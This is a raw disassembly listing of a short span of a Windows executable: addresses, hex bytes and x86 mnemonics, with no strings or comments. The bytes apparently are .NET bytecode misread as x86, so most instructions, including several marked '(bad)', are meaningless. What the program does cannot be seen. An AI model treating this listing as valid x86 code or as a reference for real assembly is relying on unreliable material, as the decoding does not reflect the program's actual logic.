  403c72:	00 70 16             	add    %dh,0x16(%eax)
  403c75:	28 ae 00 00 0a 2c    	sub    %ch,0x2c0a0000(%esi)
  403c7b:	55                   	push   %ebp
  403c7c:	07                   	pop    %es
  403c7d:	14 72                	adc    $0x72,%al
  403c7f:	d9 06                	flds   (%esi)
  403c81:	00 70 18             	add    %dh,0x18(%eax)
  403c84:	8d 03                	lea    (%ebx),%eax
  403c86:	00 00                	add    %al,(%eax)
  403c88:	01 13                	add    %edx,(%ebx)
  403c8a:	08 11                	or     %dl,(%ecx)
  403c8c:	08 16                	or     %dl,(%esi)
  403c8e:	14 a2                	adc    $0xa2,%al
  403c90:	11 08                	adc    %ecx,(%eax)
  403c92:	17                   	pop    %ss
  403c93:	17                   	pop    %ss
  403c94:	8d 03                	lea    (%ebx),%eax
  403c96:	00 00                	add    %al,(%eax)
  403c98:	01 13                	add    %edx,(%ebx)
  403c9a:	09 11                	or     %edx,(%ecx)
  403c9c:	09 16                	or     %edx,(%esi)
  403c9e:	7e 1a                	jle    0x403cba
  403ca0:	00 00                	add    %al,(%eax)
  403ca2:	04 18                	add    $0x18,%al
  403ca4:	9a 28 af 00 00 0a 8c 	lcall  $0x8c0a,$0xaf28
  403cab:	71 00                	jno    0x403cad
  403cad:	00 01                	add    %al,(%ecx)
  403caf:	a2 11 09 a2 11       	mov    %al,0x11a20911
  403cb4:	08 14 14             	or     %dl,(%esp,%edx,1)
  403cb7:	14 28                	adc    $0x28,%al
  403cb9:	ad                   	lods   %ds:(%esi),%eax
  403cba:	00 00                	add    %al,(%eax)
  403cbc:	0a 28                	or     (%eax),%ch
  403cbe:	21 00                	and    %eax,(%eax)
  403cc0:	00 0a                	add    %cl,(%edx)
  403cc2:	28 30                	sub    %dh,(%eax)
  403cc4:	00 00                	add    %al,(%eax)
  403cc6:	06                   	push   %es
  403cc7:	dd 9d 01 00 00 38    	fstpl  0x38000001(%ebp)
  403ccd:	51                   	push   %ecx
  403cce:	01 00                	add    %eax,(%eax)
  403cd0:	00 07                	add    %al,(%edi)
  403cd2:	14 72                	adc    $0x72,%al
  403cd4:	11 03                	adc    %eax,(%ebx)
  403cd6:	00 70 16             	add    %dh,0x16(%eax)
  403cd9:	8d 03                	lea    (%ebx),%eax
  403cdb:	00 00                	add    %al,(%eax)
  403cdd:	01 14 14             	add    %edx,(%esp,%edx,1)
  403ce0:	14 28                	adc    $0x28,%al
  403ce2:	ad                   	lods   %ds:(%esi),%eax
  403ce3:	00 00                	add    %al,(%eax)
  403ce5:	0a 72 45             	or     0x45(%edx),%dh
  403ce8:	07                   	pop    %es
  403ce9:	00 70 16             	add    %dh,0x16(%eax)
  403cec:	28 ae 00 00 0a 39    	sub    %ch,0x390a0000(%esi)
  403cf2:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  403cf3:	00 00                	add    %al,(%eax)
  403cf5:	00 7e 1a             	add    %bh,0x1a(%esi)
  403cf8:	00 00                	add    %al,(%eax)
  403cfa:	04 18                	add    $0x18,%al
  403cfc:	9a 28 b2 00 00 0a 39 	lcall  $0x390a,$0xb228
  403d03:	91                   	xchg   %eax,%ecx
  403d04:	00 00                	add    %al,(%eax)
  403d06:	00 7e 1b             	add    %bh,0x1b(%esi)
  403d09:	00 00                	add    %al,(%eax)
  403d0b:	04 17                	add    $0x17,%al
  403d0d:	3b 81 00 00 00 17    	cmp    0x17000000(%ecx),%eax
  403d13:	80 1b 00             	sbbb   $0x0,(%ebx)
  403d16:	00 04 07             	add    %al,(%edi,%eax,1)
  403d19:	14 72                	adc    $0x72,%al
  403d1b:	d9 06                	flds   (%esi)
  403d1d:	00 70 18             	add    %dh,0x18(%eax)
  403d20:	8d 03                	lea    (%ebx),%eax
  403d22:	00 00                	add    %al,(%eax)
  403d24:	01 13                	add    %edx,(%ebx)
  403d26:	08 11                	or     %dl,(%ecx)
  403d28:	08 16                	or     %dl,(%esi)
  403d2a:	14 a2                	adc    $0xa2,%al
  403d2c:	11 08                	adc    %ecx,(%eax)
  403d2e:	17                   	pop    %ss
  403d2f:	1b 8d 03 00 00 01    	sbb    0x1000003(%ebp),%ecx
  403d35:	13 09                	adc    (%ecx),%ecx
  403d37:	11 09                	adc    %ecx,(%ecx)
  403d39:	16                   	push   %ss
  403d3a:	28 4d 00             	sub    %cl,0x0(%ebp)
  403d3d:	00 06                	add    %al,(%esi)
  403d3f:	a2 11 09 17 7e       	mov    %al,0x7e170911
  403d44:	1a 00                	sbb    (%eax),%al
  403d46:	00 04 19             	add    %al,(%ecx,%ebx,1)
  403d49:	9a 28 83 00 00 0a 28 	lcall  $0x280a,$0x8328
  403d50:	51                   	push   %ecx
  403d51:	00 00                	add    %al,(%eax)
  403d53:	06                   	push   %es
  403d54:	a2 11 09 18 7e       	mov    %al,0x7e180911
  403d59:	1a 00                	sbb    (%eax),%al
  403d5b:	00 04 1a             	add    %al,(%edx,%ebx,1)
  403d5e:	9a a2 11 09 19 7e 1a 	lcall  $0x1a7e,$0x190911a2
  403d65:	00 00                	add    %al,(%eax)
  403d67:	04 1b                	add    $0x1b,%al
  403d69:	9a a2 11 09 1a 7e 1a 	lcall  $0x1a7e,$0x1a0911a2
  403d70:	00 00                	add    %al,(%eax)
  403d72:	04 1c                	add    $0x1c,%al
  403d74:	9a a2 11 09 a2 11 08 	lcall  $0x811,$0xa20911a2
  403d7b:	14 14                	adc    $0x14,%al
  403d7d:	14 28                	adc    $0x28,%al
  403d7f:	ad                   	lods   %ds:(%esi),%eax
  403d80:	00 00                	add    %al,(%eax)
  403d82:	0a 28                	or     (%eax),%ch
  403d84:	21 00                	and    %eax,(%eax)
  403d86:	00 0a                	add    %cl,(%edx)
  403d88:	28 2f                	sub    %ch,(%edi)
  403d8a:	00 00                	add    %al,(%eax)
  403d8c:	06                   	push   %es
  403d8d:	18 80 1b 00 00 04    	sbb    %al,0x400001b(%eax)
  403d93:	dd d1                	fst    %st(1)
  403d95:	00 00                	add    %al,(%eax)
  403d97:	00 38                	add    %bh,(%eax)
  403d99:	85 00                	test   %eax,(%eax)
  403d9b:	00 00                	add    %al,(%eax)
  403d9d:	07                   	pop    %es
  403d9e:	14 72                	adc    $0x72,%al
  403da0:	11 03                	adc    %eax,(%ebx)
  403da2:	00 70 16             	add    %dh,0x16(%eax)
  403da5:	8d 03                	lea    (%ebx),%eax
  403da7:	00 00                	add    %al,(%eax)
  403da9:	01 14 14             	add    %edx,(%esp,%edx,1)
  403dac:	14 28                	adc    $0x28,%al
  403dae:	ad                   	lods   %ds:(%esi),%eax
  403daf:	00 00                	add    %al,(%eax)
  403db1:	0a 72 4d             	or     0x4d(%edx),%dh
  403db4:	07                   	pop    %es
  403db5:	00 70 16             	add    %dh,0x16(%eax)
  403db8:	28 ae 00 00 0a 2c    	sub    %ch,0x2c0a0000(%esi)
  403dbe:	63 7e 1a             	arpl   %edi,0x1a(%esi)
  403dc1:	00 00                	add    %al,(%eax)
  403dc3:	04 18                	add    $0x18,%al
  403dc5:	9a 28 b2 00 00 0a 2d 	lcall  $0x2d0a,$0xb228
  403dcc:	55                   	push   %ebp
  403dcd:	7e 1b                	jle    0x403dea
  403dcf:	00 00                	add    %al,(%eax)
  403dd1:	04 18                	add    $0x18,%al
  403dd3:	33 4b 17             	xor    0x17(%ebx),%ecx
  403dd6:	80 1b 00             	sbbb   $0x0,(%ebx)
  403dd9:	00 04 07             	add    %al,(%edi,%eax,1)
  403ddc:	14 72                	adc    $0x72,%al
  403dde:	d9 06                	flds   (%esi)
  403de0:	00 70 18             	add    %dh,0x18(%eax)
  403de3:	8d 03                	lea    (%ebx),%eax
  403de5:	00 00                	add    %al,(%eax)
  403de7:	01 13                	add    %edx,(%ebx)
  403de9:	08 11                	or     %dl,(%ecx)
  403deb:	08 16                	or     %dl,(%esi)
  403ded:	14 a2                	adc    $0xa2,%al
  403def:	11 08                	adc    %ecx,(%eax)
  403df1:	17                   	pop    %ss
  403df2:	17                   	pop    %ss
  403df3:	8d 03                	lea    (%ebx),%eax
  403df5:	00 00                	add    %al,(%eax)
  403df7:	01 13                	add    %edx,(%ebx)
  403df9:	09 11                	or     %edx,(%ecx)
  403dfb:	09 16                	or     %edx,(%esi)
  403dfd:	28 4d 00             	sub    %cl,0x0(%ebp)
  403e00:	00 06                	add    %al,(%esi)
  403e02:	a2 11 09 a2 11       	mov    %al,0x11a20911
  403e07:	08 14 14             	or     %dl,(%esp,%edx,1)
  403e0a:	14 28                	adc    $0x28,%al
  403e0c:	ad                   	lods   %ds:(%esi),%eax
  403e0d:	00 00                	add    %al,(%eax)
  403e0f:	0a 28                	or     (%eax),%ch
  403e11:	21 00                	and    %eax,(%eax)
  403e13:	00 0a                	add    %cl,(%edx)
  403e15:	28 2f                	sub    %ch,(%edi)
  403e17:	00 00                	add    %al,(%eax)
  403e19:	06                   	push   %es
  403e1a:	16                   	push   %ss
  403e1b:	80 1b 00             	sbbb   $0x0,(%ebx)
  403e1e:	00 04 de             	add    %al,(%esi,%ebx,8)
  403e21:	47                   	inc    %edi
  403e22:	11 06                	adc    %eax,(%esi)
  403e24:	17                   	pop    %ss
  403e25:	d6                   	salc
  403e26:	13 06                	adc    (%esi),%eax
  403e28:	11 06                	adc    %eax,(%esi)
  403e2a:	11 07                	adc    %eax,(%edi)
  403e2c:	8e b7 3f cc fb ff    	mov    -0x433c1(%edi),%?
  403e32:	ff 11                	call   *(%ecx)
  403e34:	04 17                	add    $0x17,%al
  403e36:	d6                   	salc
  403e37:	13 04 11             	adc    (%ecx,%edx,1),%eax
  403e3a:	04 11                	add    $0x11,%al
  403e3c:	05 8e b7 3f 8e       	add    $0x8e3fb78e,%eax
  403e41:	fb                   	sti
  403e42:	ff                   	(bad)
  403e43:	ff                   	lcall  (bad)
  403e44:	de 23                	fisubs (%ebx)
  403e46:	25 28 22 00 00       	and    $0x2228,%eax
  403e4b:	0a 0d 72 55 07 00    	or     0x75572,%cl
  403e51:	70 09                	jo     0x403e5c
  403e53:	6f                   	outsl  %ds:(%esi),(%dx)
  403e54:	92                   	xchg   %eax,%edx
  403e55:	00 00                	add    %al,(%eax)
  403e57:	0a 28                	or     (%eax),%ch
  403e59:	42                   	inc    %edx
  403e5a:	00 00                	add    %al,(%eax)
  403e5c:	0a 28                	or     (%eax),%ch
  403e5e:	30 00                	xor    %al,(%eax)
  403e60:	00 06                	add    %al,(%esi)
  403e62:	28 24 00             	sub    %ah,(%eax,%eax,1)
  403e65:	00 0a                	add    %cl,(%edx)
  403e67:	de 00                	fiadds (%eax)
  403e69:	2a 00                	sub    (%eax),%al
  403e6b:	00 41 1c             	add    %al,0x1c(%ecx)
	...
  403e76:	00 00                	add    %al,(%eax)
  403e78:	8e 04 00             	mov    (%eax,%eax,1),%es
  403e7b:	00 8e 04 00 00 23    	add    %cl,0x23000004(%esi)
  403e81:	00 00                	add    %al,(%eax)
  403e83:	00 25 00 00 01 1b    	add    %ah,0x1b010000
  403e89:	30 03                	xor    %al,(%ebx)
  403e8b:	00 26                	add    %ah,(%esi)
  403e8d:	00 00                	add    %al,(%eax)
  403e8f:	00 1f                	add    %bl,(%edi)
  403e91:	00 00                	add    %al,(%eax)
  403e93:	11 72 73             	adc    %esi,0x73(%edx)
  403e96:	07                   	pop    %es
  403e97:	00 70 7e             	add    %dh,0x7e(%eax)
  403e9a:	0a 00                	or     (%eax),%al
  403e9c:	00 04 02             	add    %al,(%edx,%eax,1)
  403e9f:	28 4f 00             	sub    %cl,0x0(%edi)
  403ea2:	00 0a                	add    %cl,(%edx)
  403ea4:	28 25 00 00 06 de    	sub    %ah,0xde060000
  403eaa:	0e                   	push   %cs
  403eab:	25 28 22 00 00       	and    $0x2228,%eax
  403eb0:	0a 0a                	or     (%edx),%cl
  403eb2:	28 24 00             	sub    %ah,(%eax,%eax,1)
  403eb5:	00 0a                	add    %cl,(%edx)
  403eb7:	de 00                	fiadds (%eax)
  403eb9:	2a 00                	sub    (%eax),%al
  403ebb:	00 01                	add    %al,(%ecx)
  403ebd:	10 00                	adc    %al,(%eax)
  403ebf:	00 00                	add    %al,(%eax)
  403ec1:	00 00                	add    %al,(%eax)
  403ec3:	00 17                	add    %dl,(%edi)
  403ec5:	17                   	pop    %ss
  403ec6:	00 0e                	add    %cl,(%esi)
  403ec8:	25 00 00 01 1b       	and    $0x1b010000,%eax
  403ecd:	30 03                	xor    %al,(%ebx)
  403ecf:	00 26                	add    %ah,(%esi)
  403ed1:	00 00                	add    %al,(%eax)
  403ed3:	00 20                	add    %ah,(%eax)
  403ed5:	00 00                	add    %al,(%eax)
  403ed7:	11 72 27             	adc    %esi,0x27(%edx)
  403eda:	02 00                	add    (%eax),%al
  403edc:	70 7e                	jo     0x403f5c
  403ede:	0a 00                	or     (%eax),%al
  403ee0:	00 04 02             	add    %al,(%edx,%eax,1)
  403ee3:	28 4f 00             	sub    %cl,0x0(%edi)
  403ee6:	00 0a                	add    %cl,(%edx)
  403ee8:	28 25 00 00 06 de    	sub    %ah,0xde060000
  403eee:	0e                   	push   %cs
  403eef:	25 28 22 00 00       	and    $0x2228,%eax
  403ef4:	0a 0a                	or     (%edx),%cl
  403ef6:	28 24 00             	sub    %ah,(%eax,%eax,1)
  403ef9:	00 0a                	add    %cl,(%edx)
  403efb:	de 00                	fiadds (%eax)
  403efd:	2a 00                	sub    (%eax),%al
  403eff:	00 01                	add    %al,(%ecx)
  403f01:	10 00                	adc    %al,(%eax)
  403f03:	00 00                	add    %al,(%eax)
  403f05:	00 00                	add    %al,(%eax)
  403f07:	00 17                	add    %dl,(%edi)
  403f09:	17                   	pop    %ss
  403f0a:	00 0e                	add    %cl,(%esi)
  403f0c:	25 00 00 01 1b       	and    $0x1b010000,%eax
  403f11:	30 05 00 d4 00 00    	xor    %al,0xd400
  403f17:	00 21                	add    %ah,(%ecx)
  403f19:	00 00                	add    %al,(%eax)
  403f1b:	11 73 5b             	adc    %esi,0x5b(%ebx)
  403f1e:	00 00                	add    %al,(%eax)
  403f20:	06                   	push   %es
  403f21:	0a 06                	or     (%esi),%al
  403f23:	02 17                	add    (%edi),%dl
  403f25:	8d 2c 00             	lea    (%eax,%eax,1),%ebp
  403f28:	00 01                	add    %al,(%ecx)
  403f2a:	13 07                	adc    (%edi),%eax
  403f2c:	11 07                	adc    %eax,(%edi)
  403f2e:	16                   	push   %ss
  403f2f:	1f                   	pop    %ds
  403f30:	3a 9d 11 07 6f 2e    	cmp    0x2e6f0711(%ebp),%bl
  403f36:	00 00                	add    %al,(%eax)
  403f38:	0a 16                	or     (%esi),%dl
  403f3a:	9a 7d 31 00 00 04 06 	lcall  $0x604,$0x317d
  403f41:	02 17                	add    (%edi),%dl
  403f43:	8d 2c 00             	lea    (%eax,%eax,1),%ebp
  403f46:	00 01                	add    %al,(%ecx)
  403f48:	13 07                	adc    (%edi),%eax
  403f4a:	11 07                	adc    %eax,(%edi)
  403f4c:	16                   	push   %ss
  403f4d:	1f                   	pop    %ds
  403f4e:	3a 9d 11 07 6f 2e    	cmp    0x2e6f0711(%ebp),%bl
  403f54:	00 00                	add    %al,(%eax)
  403f56:	0a 17                	or     (%edi),%dl
  403f58:	9a 7d 32 00 00 04 02 	lcall  $0x204,$0x327d
  403f5f:	17                   	pop    %ss
  403f60:	8d 2c 00             	lea    (%eax,%eax,1),%ebp
  403f63:	00 01                	add    %al,(%ecx)
  403f65:	13 07                	adc    (%edi),%eax
  403f67:	11 07                	adc    %eax,(%edi)
  403f69:	16                   	push   %ss
  403f6a:	1f                   	pop    %ds
  403f6b:	3a 9d 11 07 6f 2e    	cmp    0x2e6f0711(%ebp),%bl
  403f71:	00 00                	add    %al,(%eax)
  403f73:	0a 18                	or     (%eax),%bl
  403f75:	9a 28 af 00 00 0a 1f 	lcall  $0x1f0a,$0xaf28
  403f7c:	3c d8                	cmp    $0xd8,%al
  403f7e:	0c 08                	or     $0x8,%al
  403f80:	6c                   	insb   (%dx),%es:(%edi)
  403f81:	28 b3 00 00 0a 0d    	sub    %dh,0xd0a0000(%ebx)
  403f87:	73 b4                	jae    0x403f3d
  403f89:	00 00                	add    %al,(%eax)
  403f8b:	0a 0b                	or     (%ebx),%cl
  403f8d:	07                   	pop    %es
  403f8e:	6f                   	outsl  %ds:(%esi),(%dx)
  403f8f:	b5 00                	mov    $0x0,%ch
  403f91:	00 0a                	add    %cl,(%edx)
  403f93:	2b 34 16             	sub    (%esi,%edx,1),%esi
  403f96:	13 05 06 25 fe 07    	adc    0x7fe2506,%eax
  403f9c:	5c                   	pop    %esp
  403f9d:	00 00                	add    %al,(%eax)
  403f9f:	06                   	push   %es
  403fa0:	73 25                	jae    0x403fc7
  403fa2:	00 00                	add    %al,(%eax)
  403fa4:	0a 73 26             	or     0x26(%ebx),%dh
  403fa7:	00 00                	add    %al,(%eax)
  403fa9:	0a 13                	or     (%ebx),%dl
  403fab:	04 11                	add    $0x11,%al
  403fad:	04 6f                	add    $0x6f,%al
  403faf:	27                   	daa
  403fb0:	00 00                	add    %al,(%eax)
  403fb2:	0a 11                	or     (%ecx),%dl
  403fb4:	05 17 d6 13 05       	add    $0x513d617,%eax
  403fb9:	11 05 1f 13 31 d9    	adc    %eax,0xd931131f
  403fbf:	20 88 13 00 00 28    	and    %cl,0x28000013(%eax)
  403fc5:	20 00                	and    %al,(%eax)
  403fc7:	00 0a                	add    %cl,(%edx)
  403fc9:	09 07                	or     %eax,(%edi)
  403fcb:	6f                   	outsl  %ds:(%esi),(%dx)
  403fcc:	b6 00                	mov    $0x0,%dh
  403fce:	00 0a                	add    %cl,(%edx)
  403fd0:	28 b7 00 00 0a 2c    	sub    %dh,0x2c0a0000(%edi)
  403fd6:	07                   	pop    %es
  403fd7:	7e 0f                	jle    0x403fe8
  403fd9:	00 00                	add    %al,(%eax)
  403fdb:	04 2d                	add    $0x2d,%al
  403fdd:	b7 de                	mov    $0xde,%bh
  403fdf:	0f 25                	(bad)
  403fe1:	28 22                	sub    %ah,(%edx)
  403fe3:	00 00                	add    %al,(%eax)
  403fe5:	0a 13                	or     (%ebx),%dl
  403fe7:	06                   	push   %es
  403fe8:	28 24 00             	sub    %ah,(%eax,%eax,1)
  403feb:	00 0a                	add    %cl,(%edx)
  403fed:	de 00                	fiadds (%eax)
  403fef:	2a 01                	sub    (%ecx),%al
  403ff1:	10 00                	adc    %al,(%eax)
  403ff3:	00 00                	add    %al,(%eax)
  403ff5:	00 00                	add    %al,(%eax)
  403ff7:	00 c4                	add    %al,%ah
  403ff9:	c4 00                	les    (%eax),%eax
  403ffb:	0f 25                	(bad)
  403ffd:	00 00                	add    %al,(%eax)
  403fff:	01 13                	add    %edx,(%ebx)
  404001:	30 08                	xor    %cl,(%eax)
  404003:	00 e3                	add    %ah,%bl
  404005:	00 00                	add    %al,(%eax)
  404007:	00 22                	add    %ah,(%edx)
  404009:	00 00                	add    %al,(%eax)
  40400b:	11 73 b8             	adc    %esi,-0x48(%ebx)
  40400e:	00 00                	add    %al,(%eax)
  404010:	0a 0c 02             	or     (%edx,%eax,1),%cl
  404013:	72 bb                	jb     0x403fd0
  404015:	02 00                	add    (%eax),%al
  404017:	70 15                	jo     0x40402e
  404019:	16                   	push   %ss
  40401a:	28 80 00 00 0a 13    	sub    %al,0x130a0000(%eax)
  404020:	05 16 13 04 2b       	add    $0x2b041316,%eax
  404025:	2c 11                	sub    $0x11,%al
  404027:	05 11 04 9a 0b       	add    $0xb9a0411,%eax
  40402c:	08 07                	or     %al,(%edi)
  40402e:	14 72                	adc    $0x72,%al
  404030:	7b 07                	jnp    0x404039
  404032:	00 70 16             	add    %dh,0x16(%eax)
  404035:	8d 03                	lea    (%ebx),%eax
  404037:	00 00                	add    %al,(%eax)
  404039:	01 14 14             	add    %edx,(%esp,%edx,1)
  40403c:	14 28                	adc    $0x28,%al
  40403e:	ad                   	lods   %ds:(%esi),%eax
  40403f:	00 00                	add    %al,(%eax)
  404041:	0a 28                	or     (%eax),%ch
  404043:	21 00                	and    %eax,(%eax)
  404045:	00 0a                	add    %cl,(%edx)
  404047:	6f                   	outsl  %ds:(%esi),(%dx)
  404048:	b9 00 00 0a 11       	mov    $0x110a0000,%ecx
  40404d:	04 17                	add    $0x17,%al
  40404f:	d6                   	salc
  404050:	13 04 11             	adc    (%ecx,%edx,1),%eax
  404053:	04 11                	add    $0x11,%al
  404055:	05 8e b7 32 cc       	add    $0xcc32b78e,%eax
  40405a:	1f                   	pop    %ds
  40405b:	1e                   	push   %ds
  40405c:	0a 38                	or     (%eax),%bh
  40405e:	82 00 00             	addb   $0x0,(%eax)
  404061:	00 28                	add    %ch,(%eax)
  404063:	ba 00 00 0a 13       	mov    $0x130a0000,%edx
  404068:	07                   	pop    %es
  404069:	16                   	push   %ss
  40406a:	13 06                	adc    (%esi),%eax
  40406c:	2b 60 11             	sub    0x11(%eax),%esp
  40406f:	07                   	pop    %es
  404070:	11 06                	adc    %eax,(%esi)
  404072:	9a 0d 09 6f bb 00 00 	lcall  $0x0,$0xbb6f090d
  404079:	0a 28                	or     (%eax),%ch
  40407b:	bc 00 00 0a 2c       	mov    $0x2c0a0000,%esp
  404080:	02 2b                	add    (%ebx),%ch
  404082:	45                   	inc    %ebp
  404083:	08 09                	or     %cl,(%ecx)
  404085:	6f                   	outsl  %ds:(%esi),(%dx)
  404086:	bb 00 00 0a 6f       	mov    $0x6f0a0000,%ebx
  40408b:	bd 00 00 0a 25       	mov    $0x250a0000,%ebp
  404090:	fe 07                	incb   (%edi)
  404092:	be 00 00 0a 73       	mov    $0x730a0000,%esi
  404097:	bf 00 00 0a 28       	mov    $0x280a0000,%edi
  40409c:	03 00                	add    (%eax),%eax
  40409e:	00 2b                	add    %ch,(%ebx)
  4040a0:	2c 26                	sub    $0x26,%al
  4040a2:	06                   	push   %es
  4040a3:	1f                   	pop    %ds
  4040a4:	1e                   	push   %ds
  4040a5:	31 21                	xor    %esp,(%ecx)
  4040a7:	16                   	push   %ss
  4040a8:	0a 72 8b             	or     -0x75(%edx),%dh
  4040ab:	07                   	pop    %es
  4040ac:	00 70 09             	add    %dh,0x9(%eax)
  4040af:	6f                   	outsl  %ds:(%esi),(%dx)
  4040b0:	bb 00 00 0a 6f       	mov    $0x6f0a0000,%ebx
  4040b5:	bd 00 00 0a 72       	mov    $0x720a0000,%ebp
  4040ba:	99                   	cltd
  4040bb:	07                   	pop    %es
  4040bc:	00 70 28             	add    %dh,0x28(%eax)
  4040bf:	4f                   	dec    %edi
  4040c0:	00 00                	add    %al,(%eax)
  4040c2:	0a 28                	or     (%eax),%ch
  4040c4:	2f                   	das
  4040c5:	00 00                	add    %al,(%eax)
  4040c7:	06                   	push   %es
  4040c8:	11 06                	adc    %eax,(%esi)
  4040ca:	17                   	pop    %ss
  4040cb:	d6                   	salc
  4040cc:	13 06                	adc    (%esi),%eax
  4040ce:	11 06                	adc    %eax,(%esi)
  4040d0:	11 07                	adc    %eax,(%edi)
  4040d2:	8e b7 32 98 06 17    	mov    0x17069832(%edi),%?
  4040d8:	d6                   	salc
  4040d9:	0a 20                	or     (%eax),%ah
  4040db:	e8 03 00 00 28       	call   0x284040e3
  4040e0:	20 00                	and    %al,(%eax)
  4040e2:	00 0a                	add    %cl,(%edx)
  4040e4:	7e 0f                	jle    0x4040f5
  4040e6:	00 00                	add    %al,(%eax)
  4040e8:	04 3a                	add    $0x3a,%al
  4040ea:	74 ff                	je     0x4040eb
  4040ec:	ff                   	(bad)
  4040ed:	ff 2a                	ljmp   *(%edx)
  4040ef:	00 1b                	add    %bl,(%ebx)
  4040f1:	30 04 00             	xor    %al,(%eax,%eax,1)
  4040f4:	96                   	xchg   %eax,%esi
  4040f5:	00 00                	add    %al,(%eax)
  4040f7:	00 23                	add    %ah,(%ebx)
  4040f9:	00 00                	add    %al,(%eax)
  4040fb:	11 03                	adc    %eax,(%ebx)
  4040fd:	39 88 00 00 00 17    	cmp    %ecx,0x17000000(%eax)
  404103:	28 84 00 00 0a 20 00 	sub    %al,0x200a00(%eax,%eax,1)
  40410a:	0c 00                	or     $0x0,%al
  40410c:	00 28                	add    %ch,(%eax)
  40410e:	85 00                	test   %eax,(%eax)
  404110:	00 0a                	add    %cl,(%edx)
  404112:	20 0f                	and    %cl,(%edi)
  404114:	27                   	daa
  404115:	00 00                	add    %al,(%eax)
  404117:	28 86 00 00 0a de    	sub    %al,-0x21f60000(%esi)
  40411d:	0c 28                	or     $0x28,%al
  40411f:	22 00                	and    (%eax),%al
  404121:	00 0a                	add    %cl,(%edx)
  404123:	28 24 00             	sub    %ah,(%eax,%eax,1)
  404126:	00 0a                	add    %cl,(%edx)
  404128:	de 00                	fiadds (%eax)
  40412a:	02 28                	add    (%eax),%ch
  40412c:	c1 00 00             	roll   $0x0,(%eax)
  40412f:	0a 74 77 00          	or     0x0(%edi,%esi,2),%dh
  404133:	00 01                	add    %al,(%ecx)
  404135:	0a 06                	or     (%esi),%al
  404137:	7e 29                	jle    0x404162
  404139:	00 00                	add    %al,(%eax)
  40413b:	04 73                	add    $0x73,%al
  40413d:	29 00                	sub    %eax,(%eax)
  40413f:	00 0a                	add    %cl,(%edx)
  404141:	7e 29                	jle    0x40416c
  404143:	00 00                	add    %al,(%eax)
  404145:	04 8e                	add    $0x8e,%al
  404147:	b7 6f                	mov    $0x6f,%bh
  404149:	2f                   	das
  40414a:	00 00                	add    %al,(%eax)
  40414c:	0a 9a 6f c2 00 00    	or     0xc26f(%edx),%bl
  404152:	0a 06                	or     (%esi),%al
  404154:	17                   	pop    %ss
  404155:	6f                   	outsl  %ds:(%esi),(%dx)
  404156:	c3                   	ret
  404157:	00 00                	add    %al,(%eax)
  404159:	0a 06                	or     (%esi),%al
  40415b:	20 10                	and    %dl,(%eax)
  40415d:	27                   	daa
  40415e:	00 00                	add    %al,(%eax)
  404160:	6f                   	outsl  %ds:(%esi),(%dx)
  404161:	c4 00                	les    (%eax),%eax
  404163:	00 0a                	add    %cl,(%edx)
  404165:	06                   	push   %es
  404166:	72 9d                	jb     0x404105
  404168:	07                   	pop    %es
  404169:	00 70 6f             	add    %dh,0x6f(%eax)
  40416c:	c5 00                	lds    (%eax),%eax
  40416e:	00 0a                	add    %cl,(%edx)
  404170:	06                   	push   %es
  404171:	6f                   	outsl  %ds:(%esi),(%dx)
  404172:	c6 00 00             	movb   $0x0,(%eax)
  404175:	0a 74 78 00          	or     0x0(%eax,%edi,2),%dh
  404179:	00 01                	add    %al,(%ecx)
  40417b:	0b de                	or     %esi,%ebx
  40417d:	0a 07                	or     (%edi),%al
  40417f:	2c 06                	sub    $0x6,%al
  404181:	07                   	pop    %es
  404182:	6f                   	outsl  %ds:(%esi),(%dx)
  404183:	58                   	pop    %eax
  404184:	00 00                	add    %al,(%eax)
  404186:	0a dc                	or     %ah,%bl
  404188:	2b 07                	sub    (%edi),%eax
  40418a:	02 28                	add    (%eax),%ch
  40418c:	8b 00                	mov    (%eax),%eax
  40418e:	00 0a                	add    %cl,(%edx)
  404190:	26 2a 00             	sub    %es:(%eax),%al
  404193:	00 01                	add    %al,(%ecx)
  404195:	1c 00                	sbb    $0x0,%al
  404197:	00 00                	add    %al,(%eax)
  404199:	00 06                	add    %al,(%esi)
  40419b:	00 1c 22             	add    %bl,(%edx,%eiz,1)
  40419e:	00 0c 25 00 00 01 02 	add    %cl,0x2010000(,%eiz,1)
  4041a5:	00 80 00 02 82 00    	add    %al,0x820200(%eax)
  4041ab:	0a 00                	or     (%eax),%al
  4041ad:	00 00                	add    %al,(%eax)
  4041af:	00 1b                	add    %bl,(%ebx)
  4041b1:	30 05 00 40 00 00    	xor    %al,0x4000
  4041b7:	00 24 00             	add    %ah,(%eax,%eax,1)
  4041ba:	00 11                	add    %dl,(%ecx)
  4041bc:	16                   	push   %ss
  4041bd:	0b 14 0c             	or     (%esp,%ecx,1),%edx
  4041c0:	07                   	pop    %es
  4041c1:	b5 1f                	mov    $0x1f,%ch
  4041c3:	64 28 c7             	fs sub %al,%bh
  4041c6:	00 00                	add    %al,(%eax)
  4041c8:	0a 13                	or     (%ebx),%dl
  4041ca:	04 12                	add    $0x12,%al
  4041cc:	04 1f                	add    $0x1f,%al
  4041ce:	64 12 02             	adc    %fs:(%edx),%al
  4041d1:	1f                   	pop    %ds
  4041d2:	64 28 35 00 00 06 2c 	sub    %dh,%fs:0x2c060000
  4041d9:	04 17                	add    $0x17,%al
  4041db:	0a de                	or     %dh,%bl
  4041dd:	1c 07                	sbb    $0x7,%al
  4041df:	17                   	pop    %ss
  4041e0:	d6                   	salc
  4041e1:	0b 07                	or     (%edi),%eax
  4041e3:	1a 31                	sbb    (%ecx),%dh
  4041e5:	d8 de                	fcomp  %st(6)
  4041e7:	0e                   	push   %cs
  4041e8:	25 28 22 00 00       	and    $0x2228,%eax
  4041ed:	0a 0d 28 24 00 00    	or     0x2428,%cl
  4041f3:	0a de                	or     %dh,%bl
  4041f5:	00 16                	add    %dl,(%esi)
  4041f7:	0a 2b                	or     (%ebx),%ch
  4041f9:	00 06                	add    %al,(%esi)
  4041fb:	2a 01                	sub    (%ecx),%al
  4041fd:	10 00                	adc    %al,(%eax)
  4041ff:	00 00                	add    %al,(%eax)
  404201:	00 00                	add    %al,(%eax)
  404203:	00 2c 2c             	add    %ch,(%esp,%ebp,1)
  404206:	00 0e                	add    %cl,(%esi)
  404208:	25 00 00 01 13       	and    $0x13010000,%eax
  40420d:	30 09                	xor    %cl,(%ecx)
  40420f:	00 c8                	add    %cl,%al
  404211:	00 00                	add    %al,(%eax)
  404213:	00 25 00 00 11 28    	add    %ah,0x28110000
  404219:	87 00                	xchg   %eax,(%eax)
  40421b:	00 0a                	add    %cl,(%edx)
  40421d:	1c 28                	sbb    $0x28,%al
  40421f:	42                   	inc    %edx
